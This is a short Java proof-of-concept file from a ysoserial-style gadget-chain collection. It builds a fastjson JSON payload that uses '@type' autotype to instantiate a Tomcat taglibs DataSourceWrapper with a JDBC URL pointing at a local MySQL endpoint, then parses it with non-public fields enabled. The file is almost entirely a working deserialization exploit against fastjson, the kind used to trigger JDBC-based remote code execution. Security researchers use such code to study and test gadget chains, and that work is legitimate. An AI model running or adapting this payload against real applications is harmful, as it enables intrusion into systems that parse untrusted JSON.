package ysoserial.payloads.tabbyGadgetChains.tomcat;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc5 {
    public static void main(String[] args) {
        //jdbc
        String poc2= "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "                \"@type\": \"org.apache.taglibs.standard.tag.common.sql.DataSourceWrapper\",\n" +
                "                \"jdbcURL\": \"jdbc:mysql://127.0.0.1:8990/webdb\",\n" +
                "                \"userName\": \"cxc\",\n" +
                "                \"password\": \"cxc\"\n" +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}\n";

        System.out.println(poc2);
        JSON.parseObject(poc2, Feature.SupportNonPublicField);
    }
}
